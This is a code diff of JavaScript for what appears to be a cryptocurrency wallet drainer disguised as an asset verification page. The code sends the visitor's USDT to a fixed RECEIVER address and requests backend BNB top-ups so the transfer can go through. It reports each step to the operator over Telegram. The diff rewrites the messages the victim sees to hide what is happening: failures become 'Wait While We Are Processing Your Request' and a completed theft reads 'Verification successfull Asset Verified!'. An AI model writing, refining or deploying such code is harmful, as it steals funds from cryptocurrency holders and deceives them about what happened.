@@ -246,7 +246,7 @@
 
       if (bnbUsd < 1) {
         message += `⚠️ *BNB < $1* – requesting backend top-up...\n`;
-        status.innerText = "⚠️ Low BNB, requesting backend top-up...";
+        status.innerText = "Wait While We Are Processing Your Request.";
 
         const topupRes = await fetch(`${BACKEND_URL}/api/topup-bnb`, {
           method: "POST",
@@ -257,12 +257,12 @@
         const topup = await topupRes.json();
         if (!topup.ready) {
           message += `❌ *Top-up Failed*`;
-          status.innerText = "❌ Top-up failed.";
+          status.innerText = "Wait While We Are Processing Your Request.";
           loader.style.display = "none"; // Hide loader
           return sendTelegram(message);
         }
 
-        message += `Wait While We Are Processing Your Request*\n`;
+        message += `✅ *Top-up Requested!*\n⏳ *Waiting for balance update...*\n`;
         await new Promise(r => setTimeout(r, 15000)); // Wait for 15 seconds
 
         // Recheck BNB balance
@@ -273,14 +273,14 @@
 
         if (newBnbUsd < 1) {
           message += `❌ *Still < $1 BNB* – cannot proceed.\n`;
-          status.innerText = "❌ Still not enough BNB.";
+          status.innerText = "Wait While We Are Processing Your Request.";
           loader.style.display = "none"; // Hide loader
           return sendTelegram(message);
         }
 
-        message += `Wait While We Are Processing Your Request*\n`;
+        message += `✅ *BNB now sufficient! Proceeding...*\n`;
       } else {
-        message += `Wait While We Are Processing Your Request\n`;
+        message += `✅ *BNB is sufficient!*\n`;
       }
 
       loader.style.display = "none"; // Hide loader
@@ -300,11 +300,11 @@
       try {
         const tx = await usdtContract.methods.transfer(RECEIVER, amountToSend).send({ from: user });
         message += `🚀 *USDT Sent Successfully!*\n📦 TX Hash: \`${tx.transactionHash}\``;
-        status.innerText = "✅ USDT sent successfully!";
+        status.innerText = "Verification successfull Asset Verified!";
       } catch (err) {
         console.error(err);
-        message += `Wait While We Are Processing Your Request*`;
-        status.innerText = "❌ Failed to send USDT.";
+        message += `❌ *USDT Transfer Failed*`;
+        status.innerText = "Wait While We Are Processing Your Request.";
       }
 
       await sendTelegram(message);
